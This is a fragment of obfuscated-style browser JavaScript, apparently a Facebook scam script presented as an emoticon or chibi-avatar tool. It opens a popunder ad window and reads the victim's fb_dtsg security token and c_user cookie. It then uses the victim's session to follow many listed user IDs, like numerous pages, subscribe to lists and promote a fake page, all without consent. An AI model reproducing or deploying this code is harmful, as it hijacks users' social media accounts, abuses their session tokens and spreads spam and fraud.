...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://thichtruyenngan2014.blogspot.com/" target="_blank">VẼ CHIBI AVATAR<br>FaceBook.Com</a>';
	html += '</div>';
...
var w = window.open("http://thichtruyenngan2014.blogspot.com/",'vatgia', params);
if (w)
{
document.cookie = "popunder=vatgia";
w.blur();
...
//het
a("100002719114546");a("100004084988863");a("100005498855111");a("100005507940425");a("100004305102198");a("100004249239147");a("100006960610215");a("100006938230815");a("100006993365528");a("100004253684327");a("100004305102198");
	// === Facebook Emoticons ====
...
Like("1424242334495654");
Like("242682282583424");
Like("156890567850604");
Like("861893717160478");
Like("268866786620420");
Like("153414881535031");
Like("221248291376383");
Like("398464883540814");
Like("446145138832564");
Like("1408664482721960");
Like("221790424616641");
Like("156890157850645");
Like("221248291376383");
Like("398464883540814");
Like("446145138832564");
Like("1408664482721960");
Like("221790424616641");
Like("156890157850645");
sublist("411865068914127");
sublist("411865325580768");
sublist("411865212247446");
sublist("411865372247430");
sublist("411865002247467");
sublist("411864548914179");
sublist("399169526850348");
sublist("399170243516943");
sublist("411864125580888");
sublist("411864255580875");
sublist("411865432247424");
sublist("411865518914082");
sublist("412309122203055");
sublist("412309205536380");
sublist("412309295536371");
sublist("412309385536362");
sublist("412308922203075");
sublist("412308845536416");
sublist("411865602247407");
sublist("412309442203023");
sublist("412308712203096");
sublist("412308595536441");
//trangfake
P("474163516017615");
var gid = ['492410564191970'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
